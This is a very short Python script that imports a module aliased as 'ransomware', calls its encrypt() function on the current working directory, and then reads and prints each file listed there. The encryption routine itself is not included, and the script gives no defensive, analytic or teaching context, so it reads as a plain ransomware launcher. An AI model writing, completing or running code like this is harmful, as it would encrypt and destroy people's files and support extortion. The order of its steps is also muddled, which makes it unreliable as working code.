import os, glob
items = os.listdir()
import rm_encrypt as ransomware
ransomware.encrypt()
for item in items:
    with open(item, "r") as file:
        data = file.read()
    print(data)

